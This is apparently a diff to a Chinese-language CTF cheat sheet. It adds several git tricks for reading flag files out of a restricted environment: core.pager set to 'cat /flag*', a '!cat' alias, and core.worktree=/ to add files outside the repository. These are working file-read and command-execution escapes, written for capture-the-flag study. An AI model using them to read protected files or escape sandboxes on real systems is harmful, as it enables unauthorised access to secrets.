@@ -943,3 +943,50 @@ git pre-commit //运行触发hook
     git cache-meta --store
     git cache-meta --apply
     ```
+    - 直接添加flag文件 commit后查看
+    ```sh
+    git init ../
+    git config --global user.email ""
+    git add --ignore-errors ../flag*
+    git commit -m ""
+    git show
+    ```
+    - 利用core.pager
+    ```sh
+    git clone https://github.com/[REDACTED]/[REDACTED]
+    git -C [REDACTED] -c core.pager="cat /flag* # " grep --open-files-in-pager
+    ```
+    git仓库里至少要有一个文件才能运行以上命令（这也是为什么开头要git clone）。要是在服务器上已知一个文件，可以`git init;git add`，一样的效果。
+    ```
+    `-C` is a flag used to run a command in a specific directory. In this case, it specifies that the following command should be run in the directory specified by `[REDACTED]`.
+    `-c` is a flag used to set a Git configuration variable. In this case, it sets the `core.pager` variable to `"cat /flag* # "`, which means that any Git command that would normally display output in a pager (such as less or more) will instead display the contents of any files that match the pattern `/flag*` followed by a comment character (#).
+    grep is a command used to search for a pattern in a file. In this case, the `--open-files-in-pager` flag tells Git to use the pager specified by the `core.pager` variable (which we set to `cat /flag* #` ) to display any files that match the pattern specified by the grep command
+    ```
+    - 利用alias
+    ```sh
+    git config --global alias.bruh '!cat /flag-*'
+    git bruh
+    ```
+    - 利用worktree
+    ```
+    First create the local repository
+    git init
+
+    Then allow files outside:
+    git config --local core.worktree /
+
+    Add the flag file:
+    git add "/flag*"
+
+    (optional) list if the file was added correctly
+    git ls-files /
+
+    Get the hash of the file
+    git cat-file --batch-check --batch-all-objects
+
+    Commit the file
+    git commit
+
+    List the contents of the flag file :)
+    git show <hash>
+    ```
